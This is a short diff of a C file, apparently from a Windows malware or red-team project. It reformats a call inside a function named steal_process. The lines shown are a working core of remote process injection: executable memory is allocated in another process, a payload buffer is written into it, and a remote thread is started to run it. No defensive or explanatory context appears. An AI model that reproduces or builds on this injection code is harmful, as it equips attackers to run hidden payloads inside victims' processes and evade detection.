@@ -52,16 +52,7 @@ int steal_process() {
     rBuffer = VirtualAllocEx(hProcess, NULL, payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
     WriteProcessMemory(hProcess, rBuffer, buf, payload_len, NULL);
 
-    hThread = CreateRemoteThreadEx(
-        hProcess, 
-        NULL, 
-        0, 
-        (LPTHREAD_START_ROUTINE)rBuffer, 
-        NULL, 
-        0, 
-        0, 
-        &new_pid
-    );
+    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &new_pid);
 
     if (hThread == NULL) {
         CloseHandle(hProcess);
